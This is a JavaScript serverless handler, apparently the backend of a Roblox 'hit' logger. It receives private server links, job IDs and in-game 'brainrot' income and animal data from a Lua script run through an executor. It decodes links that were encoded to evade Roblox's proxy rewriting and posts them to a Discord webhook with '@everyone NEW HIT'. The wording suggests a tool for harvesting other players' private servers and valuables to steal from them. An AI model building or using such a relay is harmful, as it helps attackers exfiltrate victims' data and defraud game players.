import fetch from 'node-fetch';

export default async function handler(req, res) {
  // Enable CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'GET') {
    return res.status(405).json({ error: 'Only GET requests allowed' });
  }

  try {
    const { 
      message, 
      username, 
      jobid, 
      placeid, 
      gamename, 
      playercount, 
      animals, 
      customlink, 
      encoding, 
      totalincome, 
      animalcount, 
      discord_webhook 
    } = req.query;

    // Get Discord webhook from query parameter (sent from Lua)
    const DISCORD_WEBHOOK = discord_webhook;

    if (!DISCORD_WEBHOOK) {
      return res.status(400).json({ 
        success: false,
        error: 'No Discord webhook provided' 
      });
    }

    // Validate Discord webhook format
    if (!DISCORD_WEBHOOK.includes('discord.com/api/webhooks/')) {
      return res.status(400).json({ 
        success: false,
        error: 'Invalid Discord webhook format' 
      });
    }

    // Decode the custom link with special handling for Roblox domain preservation
    let joinLinks = "";
    let finalCustomLink = "";
    
    if (customlink && customlink !== "None") {
      let decodedLink = decodeURIComponent(customlink);
      
      // If special encoding was used (to bypass Roblox's roproxy conversion)
      if (encoding === "special") {
        decodedLink = decodedLink.replace(/ROBLOX_DOT_COM/g, "roblox.com");
        decodedLink = decodedLink.replace(/WWW_DOT_/g, "www.");
      }
      
      finalCustomLink = decodedLink;
      joinLinks = `**[🔗 Private Server Link](${decodedLink}&type=Server)**\n`;
      
      console.log("Custom link preserved:", decodedLink);
    } else {
      // Only generate auto-links if no custom link provided
      const robloxProtocolLink = `roblox://placeId=${placeid}&gameInstanceId=${jobid}`;
      const webLink = `https://www.roblox.com/games/start?placeId=${placeid}&gameInstanceId=${jobid}`;
      joinLinks = `**[Desktop App](${robloxProtocolLink})** • **[Web Browser](${webLink})**`;
    }

    // Format total income for display
    let formattedTotalIncome = "";
    if (totalincome) {
      const incomeNum = parseInt(totalincome);
      if (incomeNum >= 1000000) {
        formattedTotalIncome = `$${(incomeNum / 1000000).toFixed(1)}M/s`;
      } else if (incomeNum >= 1000) {
        formattedTotalIncome = `$${(incomeNum / 1000).toFixed(1)}K/s`;
      } else {
        formattedTotalIncome = `$${incomeNum}/s`;
      }
    }

    // Create embed with income data
    const embed = {
      title: gamename ? `${gamename} - Private Server` : 'Roblox Private Server',
      color: 10181046, // Purple color for private servers
      timestamp: new Date().toISOString(),
      fields: [
        {
          name: '🔗 Join Links',
          value: joinLinks,
          inline: false
        },
        {
          name: '🛡️ Server Type',
          value: '**Private Server** ✅',
          inline: true
        }
      ]
    };

    // Add income data if available
    if (totalincome && animalcount) {
      embed.fields.push({
        name: '💰 Total Income',
        value: `**${formattedTotalIncome}**`,
        inline: true
      });
    }

    // Add player count if available
    if (playercount) {
      embed.fields.push({
        name: '👥 Players',
        value: playercount,
        inline: true
      });
    }

    // Add animals data if available
    if (animals && animals !== "No%20animals%20found" && animals !== "None") {
      const decodedAnimals = decodeURIComponent(animals);
      
      // Format animals field differently if we have income data
      if (totalincome) {
        embed.fields.push({
          name: `🐾 Animal Details (${animalcount} animals)`,
          value: decodedAnimals.length > 1024 ? decodedAnimals.substring(0, 1020) + "..." : decodedAnimals,
          inline: false
        });
      } else {
        embed.fields.push({
          name: '🐾 Animals Found',
          value: decodedAnimals.length > 1024 ? decodedAnimals.substring(0, 1020) + "..." : decodedAnimals,
          inline: false
        });
      }
    }

    // Add custom message if provided
    if (message && message !== "Server%20info%20from%20Delta") {
      const decodedMessage = decodeURIComponent(message);
      embed.fields.push({
        name: '💬 Note',
        value: decodedMessage,
        inline: false
      });
    }

    // Create webhook content based on available data
    let content = '';
    if (customlink && customlink !== "None") {
      content = `@everyone NEW HIT`;
    }

    // Add income to content if available
    if (totalincome) {
      content += `\n💰 **Total Brainrot Value:** **__${formattedTotalIncome}__**`;
    }

    const webhookData = {
      username: username || 'THE FORG',
      embeds: [embed],
      content: content
    };

    console.log('Sending to Discord webhook:', DISCORD_WEBHOOK);
    console.log('Webhook data:', JSON.stringify(webhookData, null, 2));

    // Send to Discord
    const discordResponse = await fetch(DISCORD_WEBHOOK, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(webhookData),
    });

    if (discordResponse.status === 204) {
      return res.status(200).json({
        success: true,
        message: 'Private server info sent to Discord!',
        server_type: 'private',
        used_custom_link: !!customlink && customlink !== "None",
        custom_link_preserved: customlink && customlink !== "None",
        original_custom_link: finalCustomLink,
        total_income: totalincome || null,
        formatted_income: formattedTotalIncome || null,
        animal_count: animalcount || null,
        jobid: jobid,
        timestamp: new Date().toISOString()
      });
    } else {
      const errorText = await discordResponse.text();
      console.error('Discord API error:', discordResponse.status, errorText);
      return res.status(500).json({
        success: false,
        error: `Discord API error: ${discordResponse.status}`,
        details: errorText
      });
    }

  } catch (error) {
    console.error('Server error:', error);
    return res.status(500).json({
      success: false,
      error: 'Server error: ' + error.message
    });
  }
}
